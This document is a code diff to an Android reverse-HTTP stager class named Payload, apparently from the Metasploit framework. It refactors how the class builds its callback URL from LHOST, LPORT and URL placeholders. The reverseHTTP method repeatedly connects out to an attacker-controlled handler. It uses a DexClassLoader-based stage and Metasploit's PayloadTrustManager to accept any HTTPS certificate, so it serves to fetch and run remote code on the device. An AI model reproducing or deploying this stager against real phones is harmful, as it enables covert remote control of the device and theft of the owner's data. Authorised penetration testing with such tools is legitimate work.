@@ -19,12 +19,16 @@ import dalvik.system.DexClassLoader;
 
 public class Payload {
 
+	final static int URI_CHECKSUM_INITJ = 88;
+	final static String AB = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+	
 	public static final String LHOST =  "XXXX127.0.0.1                       ";
 	public static final String LPORT =  "YYYY4444                            ";
 	public static final String URL =    "ZZZZ                                ";
 	public static final String TRIALS = "TTTT                                ";
 
 	public static Context context;
+	static Random rnd = new Random();
 
 	public static void main(String[] args) {
 
@@ -50,9 +54,6 @@ public class Payload {
 		}
 	}
 
-	static final String AB = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
-	static Random rnd = new Random();
-
 	static String randomString(int len) {
 		StringBuilder sb = new StringBuilder(len);
 		for (int i = 0; i < len; i++)
@@ -67,15 +68,12 @@ public class Payload {
 		return tmp % 0x100;
 	}
 
-	static int URI_CHECKSUM_INITJ = 88;
-
 	private static void reverseHTTP() throws Exception {
 		int checksum = 0;
 		String URI;
 		HttpURLConnection urlConn;
 
-		String lhost = URL.substring(4).trim();
-		String lport = LPORT.substring(4).trim();
+		String lurl = URL.substring(4).trim();
 
 		while (true) {
 			URI = randomString(4);
@@ -86,10 +84,9 @@ public class Payload {
 
 		String FullURI = "/" + URI.toString();
 
-		URL url = new URL(lhost + ":" + lport + FullURI + "_"
-				+ randomString(16));
+		URL url = new URL(lurl + FullURI + "_" + randomString(16));
 
-		if (lhost.startsWith("https")) {
+		if (lurl.startsWith("https")) {
 			urlConn = (HttpsURLConnection) url.openConnection();
 			Class.forName("com.metasploit.stage.PayloadTrustManager")
 					.getMethod("useFor", new Class[] { URLConnection.class })
